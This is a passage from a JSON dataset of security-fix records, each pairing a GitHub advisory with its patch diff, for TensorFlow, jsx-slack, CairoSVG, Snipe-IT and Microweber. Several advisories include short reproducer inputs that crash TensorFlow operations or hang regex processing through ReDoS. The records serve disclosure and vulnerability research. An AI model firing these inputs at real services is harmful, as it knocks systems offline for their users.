370110290\nchange-id: i4451e92661a55c2180f80d38b67a9b50bf5edec5","language":"en","entities":"[('fix', 'ACTION', ''), ('370110290', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse\/kernels.cc'])","num_files":1.0},{"index":2099,"vuln_id":"GHSA-hp4c-x6r7-6555","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d9204be9f49520cdaaeb2541d1dc5187b23f31d9'}","dataset":"osv","summary":"Floating point exception in `SparseDenseCwiseDiv` ### Impact\nThe implementation of `tf.raw_ops.SparseDenseCwiseDiv` is vulnerable to a division by 0 error:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv( \n  sp_indices=np.array([[4]]),\n  sp_values=np.array([-400]),\n  sp_shape=np.array([647.]),\n  dense=np.array([0]))\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1bc56203f21a5a4995311825ffaba7a670d7747\/tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc#L56) uses a common class for all binary operations but fails to treat the division by 0 case separately.\n\n### Patches\nWe have patched the issue in GitHub commit [d9204be9f49520cdaaeb2541d1dc5187b23f31d9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d9204be9f49520cdaaeb2541d1dc5187b23f31d9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d9204be9f49520cdaaeb2541d1dc5187b23f31d9","commit_sha":"d9204be9f49520cdaaeb2541d1dc5187b23f31d9","patch":"SINGLE","chain_ord":"['d9204be9f49520cdaaeb2541d1dc5187b23f31d9']","before_first_fix_commit":"{'a95743ddba81449601bc32f249d979a944502de6'}","last_fix_commit":"d9204be9f49520cdaaeb2541d1dc5187b23f31d9","chain_ord_pos":1.0,"commit_datetime":"07\/10\/2021, 01:27:22","message":"Disallow division by zero FPE in tf.raw_ops.SparseDenseCwiseDiv\n\nPiperOrigin-RevId: 383959809\nChange-Id: Ibe88458bdf66a686c93e354b8255dec94285c560","author":"Laura Pak","comments":null,"stats":"{'additions': 10, 'deletions': 1, 'total': 11}","files":"{'tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc': {'additions': 10, 'deletions': 1, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/d9204be9f49520cdaaeb2541d1dc5187b23f31d9\/tensorflow%2Fcore%2Fkernels%2Fsparse_dense_binary_op_shared.cc', 'patch': '@@ -114,7 +114,10 @@ class SparseDenseBinaryOpShared : public OpKernel {\\n     OP_REQUIRES_OK(\\n         ctx, ctx->allocate_temp(DataTypeToEnum<T>::value, TensorShape({nnz}),\\n                                 &dense_gathered));\\n-\\n+    bool op_is_div = false;\\n+    if (absl::StrContains(ctx->op_kernel().type_string_view(), \"Div\")) {\\n+      op_is_div = true;\\n+    }\\n     \/\/ Pulls relevant entries from the dense side, with reshape and broadcasting\\n     \/\/ *of the dense side* taken into account.  Use a TensorRef to avoid blowing\\n     \/\/ up memory.\\n@@ -143,6 +146,12 @@ class SparseDenseBinaryOpShared : public OpKernel {\\n           errors::InvalidArgument(\"Provided indices are out-of-bounds w.r.t. \" \\\\\\n                                   \"dense side with broadcasted shape\"));       \\\\\\n       dense_gathered_flat(i) = rhs_ref.coeff(idx);                             \\\\\\n+      if (op_is_div) {                                                         \\\\\\n+        OP_REQUIRES(ctx, dense_gathered_flat(i) != 0,                          \\\\\\n+                    errors::InvalidArgument(                                   \\\\\\n+                        \"SparseDenseCwiseDiv cannot divide by zero,\"           \\\\\\n+                        \"but input dense tensor contains zero \"));             \\\\\\n+      }                                                                        \\\\\\n     }                                                                          \\\\\\n     break;                                                                     \\\\\\n   }'}}","message_norm":"disallow division by zero fpe in tf.raw_ops.sparsedensecwisediv\n\npiperorigin-revid: 383959809\nchange-id: ibe88458bdf66a686c93e354b8255dec94285c560","language":"en","entities":"[('division by zero', 'SECWORD', ''), ('fpe', 'SECWORD', ''), ('383959809', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc'])","num_files":1.0},{"index":2100,"vuln_id":"GHSA-hp68-xhvj-x6j6","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/yhatt\/jsx-slack\/commit\/46bc88391d89d5fda4ce689e18ca080bcdd29ecc'}","dataset":"osv","summary":"jsx-slack insufficient patch for CVE-2021-43838 ReDoS We found the patch for CVE-2021-43838 in jsx-slack v4.5.1 is insufficient to save from Regular Expression Denial of Service (ReDoS) attack.\n\nThis vulnerability affects to jsx-slack v4.5.1 and earlier versions.\n\n### Impact\n\nIf attacker can put a lot of JSX elements into `<blockquote>` tag _with including multibyte characters_, an internal regular expression for escaping characters may consume an excessive amount of computing resources.\n\n```javascript\n\/** @jsxImportSource jsx-slack *\/\nimport { Section } from 'jsx-slack'\n\nconsole.log(\n  <Section>\n    <blockquote>\n      {[...Array(40)].map(() => (\n        <p>\u4e9c<\/p>\n      ))}\n    <\/blockquote>\n  <\/Section>\n)\n```\n\nv4.5.1 has released by passing the test against ASCII characters but missed the case of multibyte characters.\nhttps:\/\/github.com\/yhatt\/jsx-slack\/security\/advisories\/GHSA-55xv-f85c-248q\n\n### Patches\n\njsx-slack v4.5.2 has updated regular expressions for escaping blockquote characters to prevent catastrophic backtracking. It is also including an updated test case to confirm rendering multiple tags in `<blockquote>` with multibyte characters.\n\n### References\n\n- https:\/\/github.com\/yhatt\/jsx-slack\/commit\/46bc88391d89d5fda4ce689e18ca080bcdd29ecc\n\n### Credits\n\nThanks to @hieki for finding out this vulnerability.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/yhatt\/jsx-slack","commit_href":"https:\/\/github.com\/yhatt\/jsx-slack\/commit\/46bc88391d89d5fda4ce689e18ca080bcdd29ecc","commit_sha":"46bc88391d89d5fda4ce689e18ca080bcdd29ecc","patch":"SINGLE","chain_ord":"['46bc88391d89d5fda4ce689e18ca080bcdd29ecc']","before_first_fix_commit":"{'c3722705c8aadf544f922a974883578aa27dbea3'}","last_fix_commit":"46bc88391d89d5fda4ce689e18ca080bcdd29ecc","chain_ord_pos":1.0,"commit_datetime":"12\/18\/2021, 07:03:24","message":"Prevent catastrophic backtracking in blockquote escape replacer","author":"Yuki Hattori","comments":null,"stats":"{'additions': 7, 'deletions': 6, 'total': 13}","files":"{'src\/mrkdwn\/escape.ts': {'additions': 7, 'deletions': 6, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/yhatt\/jsx-slack\/raw\/46bc88391d89d5fda4ce689e18ca080bcdd29ecc\/src%2Fmrkdwn%2Fescape.ts', 'patch': '@@ -1,20 +1,21 @@\\n \/\/ An internal HTML tag and emoji shorthand should not escape\\n const preventEscapeRegex =\\n-  \/(<.*?>|:[-a-z0-9\u00c0\u00c1\u00c2\u00c3\u00c4\u00c7\u00c8\u00c9\u00ca\u00cb\u00cd\u00ce\u00cf\u00d1\u00d3\u00d4\u00d5\u00d6\u0152\u0153\u00d9\u00da\u00db\u00dc\u0178\u00df\u00e0\u00e1\u00e2\u00e3\u00e4\u00e7\u00e8\u00e9\u00ea\u00eb\u00ed\u00ee\u00ef\u00f1\u00f3\u00f4\u00f5\u00f6\u00f9\u00fa\u00fb\u00fc\u00ff_\uff3f+\uff0b\\'\\\\u1100-\\\\u11ff\\\\u2e80-\\\\u2fd5\\\\u3005\\\\u3041-\\\\u3096\\\\u30a0-\\\\u30ff\\\\u3130-\\\\u318f\\\\u3400-\\\\u4db5\\\\u4e00-\\\\u9fcb\\\\ua960-\\\\ua97f\\\\uac00-\\\\ud7ff\\\\uff10-\\\\uff19\\\\uff41-\\\\uff5a\\\\uff61-\\\\uff9f]+:)\/\\n+  \/(<[^>]*>|:[-a-z0-9\u00c0\u00c1\u00c2\u00c3\u00c4\u00c7\u00c8\u00c9\u00ca\u00cb\u00cd\u00ce\u00cf\u00d1\u00d3\u00d4\u00d5\u00d6\u0152\u0153\u00d9\u00da\u00db\u00dc\u0178\u00df\u00e0\u00e1\u00e2\u00e3\u00e4\u00e7\u00e8\u00e9\u00ea\u00eb\u00ed\u00ee\u00ef\u00f1\u00f3\u00f4\u00f5\u00f6\u00f9\u00fa\u00fb\u00fc\u00ff_\uff3f+\uff0b\\'\\\\u1100-\\\\u11ff\\\\u2e80-\\\\u2fd5\\\\u3005\\\\u3041-\\\\u3096\\\\u30a0-\\\\u30ff\\\\u3130-\\\\u318f\\\\u3400-\\\\u4db5\\\\u4e00-\\\\u9fcb\\\\ua960-\\\\ua97f\\\\uac00-\\\\ud7ff\\\\uff10-\\\\uff19\\\\uff41-\\\\uff5a\\\\uff61-\\\\uff9f]+:)\/\\n \\n const generateReplacerForEscape = (fallback: string) => (matched: string) =>\\n   `<span data-escape=\"${fallback.repeat(matched.length)}\">${matched}<\/span>`\\n \\n export const escapeReplacers = {\\n   blockquote: (partial: string) =>\\n     partial\\n-      .replace(\/^((?:<.*?>)*)(.{4})\/gm, (matched, leading, character) =>\\n-        character === \\'&gt;\\' ? `${leading}\\\\u00ad&gt;` : matched\\n+      .replace(\\n+        \/^((?:<(?:[^>]|>(?=<))*>)?)(&gt;)\/gm,\\n+        (_, leadingTags, character) => `${leadingTags}\\\\u00ad${character}`\\n       )\\n       .replace(\\n-        \/^((?:<.*?>)*)(\uff1e)\/gm,\\n-        (_, leading, character) =>\\n-          `${leading}${generateReplacerForEscape(\\'\\\\u00ad\uff1e\\')(character)}`\\n+        \/^((?:<(?:[^>]|>(?=<))*>)?)(\uff1e)\/gm,\\n+        (_, leadingTags, character) =>\\n+          `${leadingTags}${generateReplacerForEscape(\\'\\\\u00ad\uff1e\\')(character)}`\\n       ),\\n   bold: (partial: string) =>\\n     partial'}}","message_norm":"prevent catastrophic backtracking in blockquote escape replacer","language":"en","entities":"[('prevent', 'ACTION', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/mrkdwn\/escape.ts'])","num_files":1.0},{"index":2109,"vuln_id":"GHSA-hpv4-7p9c-mvfr","cwe_id":"{'CWE-787', 'CWE-125'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0f931751fb20f565c4e94aa6df58d54a003cdb30'}","dataset":"osv","summary":"Heap buffer overflow in `FractionalAvgPoolGrad` ### Impact\nThe implementation for `tf.raw_ops.FractionalAvgPoolGrad` can be tricked into accessing data outside of bounds of heap allocated buffers:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=[0,1,2,3],\n  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),\n  row_pooling_sequence=[0, 0, 0, 0, 0],\n  col_pooling_sequence=[-2, 0, 0, 2, 0],\n  overlapping=True)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/fractional_avg_pool_op.cc#L205) does not validate that the input tensor is non-empty. Thus, code constructs an empty `EigenDoubleMatrixMap` and then accesses this buffer with indices that are outside of the empty area.\n\n### Patches\nWe have patched the issue in GitHub commit [0f931751fb20f565c4e94aa6df58d54a003cdb30](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0f931751fb20f565c4e94aa6df58d54a003cdb30).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0f931751fb20f565c4e94aa6df58d54a003cdb30","commit_sha":"0f931751fb20f565c4e94aa6df58d54a003cdb30","patch":"SINGLE","chain_ord":"['0f931751fb20f565c4e94aa6df58d54a003cdb30']","before_first_fix_commit":"{'55e763ffe2b348a61ab1c2fcfedc7bdf05c91990'}","last_fix_commit":"0f931751fb20f565c4e94aa6df58d54a003cdb30","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 20:03:44","message":"Validate dimensions of input tensor in `FractionalAvgPoolGrad`\n\nPiperOrigin-RevId: 388286227\nChange-Id: Ieb7566155e92acc8993a2212c76deacadc0edc8a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/kernels\/fractional_avg_pool_op.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0f931751fb20f565c4e94aa6df58d54a003cdb30\/tensorflow%2Fcore%2Fkernels%2Ffractional_avg_pool_op.cc', 'patch': '@@ -271,6 +271,18 @@ class FractionalAvgPoolGradOp : public OpKernel {\\n     const int64_t in_rows = orig_input_tensor_shape_flat(1);\\n     const int64_t in_cols = orig_input_tensor_shape_flat(2);\\n     const int64_t in_depth = orig_input_tensor_shape_flat(3);\\n+    OP_REQUIRES(\\n+        context, in_batch != 0,\\n+        errors::InvalidArgument(\"Batch dimension of input must not be 0\"));\\n+    OP_REQUIRES(\\n+        context, in_rows != 0,\\n+        errors::InvalidArgument(\"Rows dimension of input must not be 0\"));\\n+    OP_REQUIRES(\\n+        context, in_cols != 0,\\n+        errors::InvalidArgument(\"Columns dimension of input must not be 0\"));\\n+    OP_REQUIRES(\\n+        context, in_depth != 0,\\n+        errors::InvalidArgument(\"Depth dimension of input must not be 0\"));\\n \\n     constexpr int tensor_in_and_out_dims = 4;\\n     \/\/ Transform orig_input_tensor_shape into TensorShape'}}","message_norm":"validate dimensions of input tensor in `fractionalavgpoolgrad`\n\npiperorigin-revid: 388286227\nchange-id: ieb7566155e92acc8993a2212c76deacadc0edc8a","language":"en","entities":"[('validate', 'ACTION', ''), ('388286227', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fractional_avg_pool_op.cc'])","num_files":1.0},{"index":2111,"vuln_id":"GHSA-hpx4-xjp7-m4vr","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/f623d05d0c3487ae24c4f13907e4709484e5bf41'}","dataset":"osv","summary":"Stored cross-site scripting in Snipe-IT Snipe-IT prior to version 5.4.3 is vulnerable to stored cross-site scripting because the input to the `checked_out_to` parameter is not escaped. The vulnerability is capable of stealing a user's cookie.","published_date":"2022-04-25","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/f623d05d0c3487ae24c4f13907e4709484e5bf41","commit_sha":"f623d05d0c3487ae24c4f13907e4709484e5bf41","patch":"SINGLE","chain_ord":"['f623d05d0c3487ae24c4f13907e4709484e5bf41']","before_first_fix_commit":"{'ef7f21e3ba01f13da2e656358343ba1236a122de'}","last_fix_commit":"f623d05d0c3487ae24c4f13907e4709484e5bf41","chain_ord_pos":1.0,"commit_datetime":"04\/24\/2022, 14:27:11","message":"Escape checkout target name\n\nSigned-off-by: snipe <snipe@snipe.net>","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/Http\/Transformers\/DepreciationReportTransformer.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/f623d05d0c3487ae24c4f13907e4709484e5bf41\/app%2FHttp%2FTransformers%2FDepreciationReportTransformer.php', 'patch': \"@@ -98,7 +98,7 @@ public function transformAsset(Asset $asset)\\n             'purchase_cost' => Helper::formatCurrencyOutput($asset->purchase_cost),\\n             'book_value' => Helper::formatCurrencyOutput($depreciated_value),\\n             'monthly_depreciation' => $monthly_depreciation,\\n-            'checked_out_to' => $checkout_target,\\n+            'checked_out_to' => ($checkout_target) ? e($checkout_target) : null,\\n             'diff' =>  Helper::formatCurrencyOutput($diff),\\n             'number_of_months' =>  ($asset->model && $asset->model->depreciation) ? e($asset->model->depreciation->months) : null,\\n             'depreciation' => (($asset->model) && ($asset->model->depreciation)) ?  e($asset->model->depreciation->name) : null,\"}}","message_norm":"escape checkout target name\n\nsigned-off-by: snipe <snipe@snipe.net>","language":"en","entities":"[('escape', 'SECWORD', ''), ('snipe@snipe.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Transformers\/DepreciationReportTransformer.php'])","num_files":1.0},{"index":2112,"vuln_id":"GHSA-hq37-853p-g5cf","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/Kozea\/CairoSVG\/commit\/cfc9175e590531d90384aa88845052de53d94bf3'}","dataset":"osv","summary":"Regular Expression Denial of Service in CairoSVG # Doyensec Vulnerability Advisory \n\n* Regular Expression Denial of Service (REDoS) in cairosvg\n* Affected Product: CairoSVG v2.0.0+\n* Vendor: https:\/\/github.com\/Kozea\n* Severity: Medium\n* Vulnerability Class: Denial of Service\n* Author(s): Ben Caller ([Doyensec](https:\/\/doyensec.com))\n\n## Summary\n\nWhen processing SVG files, the python package CairoSVG uses two regular expressions which are vulnerable to Regular Expression Denial of Service (REDoS).\nIf an attacker provides a malicious SVG, it can make cairosvg get stuck processing the file for a very long time.\n\n## Technical description\n\nThe vulnerable regular expressions are\n\nhttps:\/\/github.com\/Kozea\/CairoSVG\/blob\/9c4a982b9a021280ad90e89707eacc1d114e4ac4\/cairosvg\/colors.py#L190-L191\n\nThe section between 'rgb(' and the final ')' contains multiple overlapping groups.\n\nSince all three infinitely repeating groups accept spaces, a long string of spaces causes catastrophic backtracking when it is not followed by a closing parenthesis.\n\nThe complexity is cubic, so doubling the length of the malicious string of spaces makes processing take 8 times as long.\n\n## Reproduction steps\n\nCreate a malicious SVG of the form:\n\n    <svg width=\"1\" height=\"1\"><rect fill=\"rgb(                     ;\"\/><\/svg>\n\nwith the following code:\n\n    '<svg width=\"1\" height=\"1\"><rect fill=\"rgb(' + (' ' * 3456) + ';\"\/><\/svg>'\n\nNote that there is no closing parenthesis before the semi-colon.\n\nRun cairosvg e.g.:\n\n    cairosvg cairo-redos.svg -o x.png\n\nand notice that it hangs at 100% CPU. Increasing the number of spaces increases the processing time with cubic complexity.\n\n## Remediation\n\nFix the regexes to avoid overlapping parts. Perhaps remove the [ \\n\\r\\t]* groups from the regex, and use .strip() on the returned capture group.\n\n## Disclosure timeline\n\n- 2020-12-30: Vulnerability disclosed via email to CourtBouillon","published_date":"2021-01-06","chain_len":1,"project":"https:\/\/github.com\/Kozea\/CairoSVG","commit_href":"https:\/\/github.com\/Kozea\/CairoSVG\/commit\/cfc9175e590531d90384aa88845052de53d94bf3","commit_sha":"cfc9175e590531d90384aa88845052de53d94bf3","patch":"SINGLE","chain_ord":"['cfc9175e590531d90384aa88845052de53d94bf3']","before_first_fix_commit":"{'9c4a982b9a021280ad90e89707eacc1d114e4ac4', '063185b60588a41d4df661ad70f9f7b699901abc'}","last_fix_commit":"cfc9175e590531d90384aa88845052de53d94bf3","chain_ord_pos":1.0,"commit_datetime":"01\/06\/2021, 14:43:14","message":"Merge pull request from GHSA-hq37-853p-g5cf\n\nDon\u2019t use overlapping groups for regular expressions","author":"Guillaume Ayoub","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'cairosvg\/colors.py': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Kozea\/CairoSVG\/raw\/cfc9175e590531d90384aa88845052de53d94bf3\/cairosvg%2Fcolors.py', 'patch': \"@@ -187,8 +187,8 @@\\n     'transparent': (0, 0, 0, 0),\\n }\\n \\n-RGBA = re.compile(r'rgba\\\\([ \\\\n\\\\r\\\\t]*(.+?)[ \\\\n\\\\r\\\\t]*\\\\)')\\n-RGB = re.compile(r'rgb\\\\([ \\\\n\\\\r\\\\t]*(.+?)[ \\\\n\\\\r\\\\t]*\\\\)')\\n+RGBA = re.compile(r'rgba\\\\((.+?)\\\\)')\\n+RGB = re.compile(r'rgb\\\\((.+?)\\\\)')\\n HEX_RRGGBB = re.compile('#[0-9a-f]{6}')\\n HEX_RGB = re.compile('#[0-9a-f]{3}')\\n \\n@@ -212,14 +212,14 @@ def color(string, opacity=1):\\n     if match:\\n         r, g, b, a = tuple(\\n             float(i.strip(' %')) \/ 100 if '%' in i else float(i) \/ 255\\n-            for i in match.group(1).split(','))\\n+            for i in match.group(1).strip().split(','))\\n         return (r, g, b, a * 255 * opacity)\\n \\n     match = RGB.search(string)\\n     if match:\\n         r, g, b = tuple(\\n             float(i.strip(' %')) \/ 100 if '%' in i else float(i) \/ 255\\n-            for i in match.group(1).split(','))\\n+            for i in match.group(1).strip().split(','))\\n         return (r, g, b, opacity)\\n \\n     match = HEX_RRGGBB.search(string)\"}}","message_norm":"merge pull request from ghsa-hq37-853p-g5cf\n\ndon\u2019t use overlapping groups for regular expressions","language":"en","entities":"[('ghsa-hq37-853p-g5cf', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['cairosvg\/colors.py'])","num_files":1.0},{"index":2117,"vuln_id":"GHSA-hr84-fqvp-48mm","cwe_id":"{'CWE-131'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5'}","dataset":"osv","summary":"Segfault in SparseCountSparseOutput ### Impact\nSpecifying a negative dense shape in `tf.raw_ops.SparseCountSparseOutput` results in a segmentation fault being thrown out from the standard library as `std::vector` invariants are broken.\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[0, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0, 0], dtype=tf.int64)\ndense_shape = tf.constant([-100, -100, -100], shape=[3], dtype=tf.int64)\nweights = tf.constant([], shape=[0, 0], dtype=tf.int64)\n\ntf.raw_ops.SparseCountSparseOutput(indices=indices, values=values, dense_shape=dense_shape, weights=weights, minlength=79, maxlength=96, binary_output=False)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8f7b60ee8c0206a2c99802e3a4d1bb55d2bc0624\/tensorflow\/core\/kernels\/count_ops.cc#L199-L213) assumes the first element of the dense shape is always positive and uses it to initialize a `BatchedMap<T>` (i.e., [`std::vector<absl::flat_hash_map<int64,T>>`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8f7b60ee8c0206a2c99802e3a4d1bb55d2bc0624\/tensorflow\/core\/kernels\/count_ops.cc#L27)) data structure.\n\n```cc\n  bool is_1d = shape.NumElements() == 1;\n  int num_batches = is_1d ? 1 : shape.flat<int64>()(0);\n  ...\n  auto per_batch_counts = BatchedMap<W>(num_batches); \n```\n\nIf the `shape` tensor has more than one element, `num_batches` is the first value in `shape`.\n                       \nEnsuring that the `dense_shape` argument is a valid tensor shape (that is, all elements are non-negative) solves this issue.\n\n### Patches\nWe have patched the issue in GitHub commit [c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5","commit_sha":"c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5","patch":"SINGLE","chain_ord":"['c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5']","before_first_fix_commit":"{'8f7b60ee8c0206a2c99802e3a4d1bb55d2bc0624'}","last_fix_commit":"c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2021, 18:33:50","message":"Fix the segfault in `tf.raw_ops.SparseCountSparseOutput`.\n\nPiperOrigin-RevId: 369264941\nChange-Id: I23a96a15b8370c01ee21ba3841e1c7dcbf55e93d","author":"Amit Patankar","comments":null,"stats":"{'additions': 9, 'deletions': 1, 'total': 10}","files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 9, 'deletions': 1, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -197,9 +197,17 @@ class SparseCount : public OpKernel {\\n                     \"The shape argument requires at least one element.\"));\\n \\n     bool is_1d = shape.NumElements() == 1;\\n-    int num_batches = is_1d ? 1 : shape.flat<int64>()(0);\\n+    auto shape_vector = shape.flat<int64>();\\n+    int num_batches = is_1d ? 1 : shape_vector(0);\\n     int num_values = values.NumElements();\\n \\n+    for (int b = 0; b < shape_vector.size(); b++) {\\n+      OP_REQUIRES(context, shape_vector(b) >= 0,\\n+                  errors::InvalidArgument(\\n+                      \"Elements in dense_shape must be >= 0. Instead got:\",\\n+                      shape.DebugString()));\\n+    }\\n+\\n     OP_REQUIRES(context, num_values == indices.shape().dim_size(0),\\n                 errors::InvalidArgument(\\n                     \"Number of values must match first dimension of indices.\",'}}","message_norm":"fix the segfault in `tf.raw_ops.sparsecountsparseoutput`.\n\npiperorigin-revid: 369264941\nchange-id: i23a96a15b8370c01ee21ba3841e1c7dcbf55e93d","language":"en","entities":"[('fix', 'ACTION', ''), ('segfault', 'SECWORD', ''), ('369264941', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])","num_files":1.0},{"index":2119,"vuln_id":"GHSA-hrf4-hcpc-3345","cwe_id":"{'CWE-190'}","score":7.1,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/f7acbd075dff4825b35b597b74958de9edce67fc'}","dataset":"osv","summary":"Denial of service in microweber Microweber is drag and drop website builder and CMS with E-commerce. The microweber prior 1.2.12 application allows large characters to insert in the input field \"post title\" which can allow attackers to cause a Denial of Service (DoS) via a crafted HTTP request. The post title input can be limited to 500 characters or max 1000 characters as a workaround.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/f7acbd075dff4825b35b597b74958de9edce67fc","commit_sha":"f7acbd075dff4825b35b597b74958de9edce67fc","patch":"SINGLE","chain_ord":"['f7acbd075dff4825b35b597b74958de9edce67fc']","before_first_fix_commit":"{'14e960d184e681507f5293be86446d18d1c125b5'}","last_fix_commit":"f7acbd075dff4825b35b597b74958de9edce67fc","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 15:00:22","message":"Update PostRequest.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'src\/MicroweberPackages\/Post\/Http\/Requests\/PostRequest.php': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/f7acbd075dff4825b35b597b74958de9edce67fc\/src%2FMicroweberPackages%2FPost%2FHttp%2FRequests%2FPostRequest.php', 'patch': \"@@ -22,8 +22,15 @@ public function authorize()\\n      *\/\\n     public function rules()\\n     {\\n+        \/\/ todo with multilanguage\\n+\\n         $rules = [\\n-           \/\/ 'title' => 'required', \/\/ todo with multilanguage\\n+            'title' => 'required|max:500',\\n+            'url' => 'max:500',\\n+            'description' => 'max:500',\\n+            'content_meta_title' => 'max:500',\\n+            'content_meta_keywords' => 'max:500',\\n+            'original_link' => 'max:500',\\n         ];\\n \\n         return $rules;\"}}","message_norm":"update postrequest.php","language":"fr","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Post\/Http\/Requests\/PostRequest.php'])","num_files":1.0},{"index":2120,"vuln_id":"GHSA-hrg5-737c-2p56","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/13d38a07ce9143e044aa737cfd7bb759d0e9b400'}","dataset":"osv","summary":"Missing validation causes denial of service via `UnsortedSegmentJoin` ### Impact\nThe implementation of 